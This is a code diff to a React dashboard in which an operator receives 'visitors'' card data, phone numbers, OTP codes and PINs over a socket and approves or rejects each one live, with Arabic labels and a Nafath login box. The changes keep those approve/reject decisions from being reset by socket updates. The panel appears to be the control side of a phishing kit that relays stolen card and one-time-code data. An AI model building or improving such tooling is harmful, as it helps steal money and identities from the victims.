@@ -107,6 +107,8 @@ export default function DashboardPage() {
   const socketRef = useRef<Socket | null>(null);
   // Track if selected request change is due to socket update (to avoid resetting local decisions)
   const isSocketUpdateRef = useRef(false);
+  // Track which specific box was updated via socket (to preserve that box's local decision)
+  const socketUpdatedBoxRef = useRef<string | null>(null);
   const currentTimeRef = useRef(Date.now());
   const headerMenuRef = useRef<HTMLDivElement | null>(null);
   const settingsModalRef = useRef<HTMLDivElement | null>(null);
@@ -429,9 +431,14 @@ export default function DashboardPage() {
         // If this is for the selected visitor, update selectedRequestId
         if (shouldUpdateSelected) {
           isSocketUpdateRef.current = true;
+          // Use a callback to set selectedRequestId which will trigger useEffect
+          // but isSocketUpdateRef.current will be true at that point
           setTimeout(() => {
             console.log("[Socket Update] Forcing re-selection for new entry");
-            setSelectedRequestId(incomingRequest.id || currentSelectedId);
+            setSelectedRequestId((prev: string | null) => {
+              // Only update if it's still the same or null
+              return incomingRequest.id || prev;
+            });
           }, 0);
         }
         
@@ -545,10 +552,18 @@ export default function DashboardPage() {
 
   // Reset local decisions when changing selected request (but NOT when it's due to socket update)
   useEffect(() => {
+    // If socket update caused this change, preserve decisions for the updated box
     if (isSocketUpdateRef.current) {
       isSocketUpdateRef.current = false;
+      // Only reset decisions for boxes that were NOT just updated via socket
+      const updatedBox = socketUpdatedBoxRef.current;
+      if (updatedBox !== "card") setCardLocalDecision(null);
+      if (updatedBox !== "phone") setPhoneLocalDecision(null);
+      if (updatedBox !== "otp") setOtpLocalDecision(null);
+      if (updatedBox !== "pin") setPinLocalDecision(null);
       return;
     }
+    // Full reset when user manually changes selection
     setCardLocalDecision(null);
     setPhoneLocalDecision(null);
     setOtpLocalDecision(null);
@@ -972,11 +987,14 @@ export default function DashboardPage() {
 
   const handleLocalOtpAction = async (action: "approved" | "rejected") => {
     setOtpLocalDecision(action);
+    socketUpdatedBoxRef.current = "otp";
     await applyLocalBoxDecision("otp", "_v5Status", action, action === "approved" ? "تم الموافقة على رمز التحقق" : "تم رفض رمز التحقق");
+    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
   };
 
   const handlePinAction = async (action: "approved" | "rejected") => {
     setPinLocalDecision(action);
+    socketUpdatedBoxRef.current = "pin";
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
     setActionLoading("pin");
@@ -999,11 +1017,14 @@ export default function DashboardPage() {
       showNotification("error", "فشل الاتصال");
     }
     setActionLoading(null);
+    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
   };
 
   const handleLocalPinAction = async (action: "approved" | "rejected") => {
     setPinLocalDecision(action);
+    socketUpdatedBoxRef.current = "pin";
     await applyLocalBoxDecision("pin", "_v6Status", action, action === "approved" ? "تم الموافقة على رمز PIN" : "تم رفض رمز PIN");
+    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
   };
 
   const handlePhoneAction = async (action: "approved" | "rejected" | "resend") => {
@@ -2865,6 +2886,7 @@ const renderNafadBox = () => {
               <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                 <button onClick={async () => { 
                   setCardLocalDecision("approved");
+                  socketUpdatedBoxRef.current = "card";
                   setActionLoading("card");
                   const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                   if (visitorId) {
@@ -2880,11 +2902,13 @@ const renderNafadBox = () => {
                     });
                   }
                   setActionLoading(null);
+                  setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                 }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   موافقة
                 </button>
                 <button onClick={async () => { 
                   setCardLocalDecision("rejected");
+                  socketUpdatedBoxRef.current = "card";
                   setActionLoading("card");
                   const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                   if (visitorId) {
@@ -2900,11 +2924,13 @@ const renderNafadBox = () => {
                     });
                   }
                   setActionLoading(null);
+                  setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                 }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   رفض
                 </button>
                 <button onClick={async () => { 
                   setCardLocalDecision("pin");
+                  socketUpdatedBoxRef.current = "card";
                   setActionLoading("card");
                   const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                   if (visitorId) {
@@ -2920,6 +2946,7 @@ const renderNafadBox = () => {
                     });
                   }
                   setActionLoading(null);
+                  setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                 }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#3b82f6", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   PIN
                 </button>
@@ -3588,6 +3615,7 @@ const renderNafadBox = () => {
                 <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                   <button onClick={async () => { 
                     setPhoneLocalDecision("approved");
+                    socketUpdatedBoxRef.current = "phone"; // Mark phone box as updated
                     setActionLoading("phone");
                     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                     if (visitorId) {
@@ -3603,11 +3631,14 @@ const renderNafadBox = () => {
                       });
                     }
                     setActionLoading(null);
+                    // Clear the marker after a delay
+                    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                   }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     موافقة
                   </button>
                   <button onClick={async () => { 
                     setPhoneLocalDecision("rejected");
+                    socketUpdatedBoxRef.current = "phone"; // Mark phone box as updated
                     setActionLoading("phone");
                     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                     if (visitorId) {
@@ -3623,6 +3654,8 @@ const renderNafadBox = () => {
                       });
                     }
                     setActionLoading(null);
+                    // Clear the marker after a delay
+                    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                   }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     رفض
                   </button>
